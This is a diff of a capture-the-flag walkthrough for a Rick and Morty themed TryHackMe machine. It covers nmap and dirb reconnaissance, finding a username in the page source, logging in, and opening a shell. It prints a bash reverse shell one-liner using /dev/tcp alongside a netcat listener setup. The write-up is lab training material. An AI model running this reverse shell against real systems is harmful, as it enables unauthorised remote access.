@@ -17,11 +17,18 @@ The first step to completing this machine is turning on the machine itself, this
 
 Firstly, I wanted to see what the site would look like. To do this, I just entered the given IP on a firefox (or any other web browswer of your choice) into the search bar. Then a Rick and Morty themed site appeared.
 
-(Put SS of site)
+
+<img width="1440" alt="Screen Shot 2022-11-12 at 1 55 48 PM" src="https://user-images.githubusercontent.com/117850176/201499314-d6bb2cb9-3cf3-41e1-bc0e-8720703272bd.png">
+
+
 
 The first step that I took was to use a nmap scan with the given IP on the tryhackme. To do this, I started a command window in kali. Once the window was opened I used the nmap command and found that ports 22 and 80 were both running. 
 
-(Put ss of nmap being used and port 22 and 80 running)
+
+
+<img width="907" alt="Screen Shot 2022-11-12 at 1 56 19 PM" src="https://user-images.githubusercontent.com/117850176/201499322-9641cf8a-861d-44ff-82c6-9016971592e3.png">
+
+
 
 After seeing this, another one of the first steps that I did was to inspect the sites source code to see if I was able to find any hints that were left within the source code. Within the source code, there is a commented section of code that gave a username, keep this username in mind as this is essential information. I won't be giving the username here, so explore the source code and it should make itself apparent to you. 
 
@@ -31,7 +38,7 @@ Dirb command is a web content scanner. It looks for existing or hidden web objec
 
 Within the directories given, I was also directed to a login page. If you explore the directories given, you should find this releatively easily. Using the credentials we found in the earlier steps, you should be able to enter the login page. After logging in, you will be presented with a command line. 
 
-(Put ss of login page, command line)
+
 
 After seeing that a command line was given, I decided to host a netcat listener on my local kali machine on port 1234. I used this port because I knew nothing would be communicating on it. The exact command that I used will be provided via the chaeatsheet.11 Netcat is a command for reading and writing data between two computers. Next, I used a bash reverse shell command that I found on gtfobins, since I found this on a third party site, I will provide the command here. 
 - bash -c 'exec bash -i &>/dev/tcp/$RHOST/$RPORT <&1'
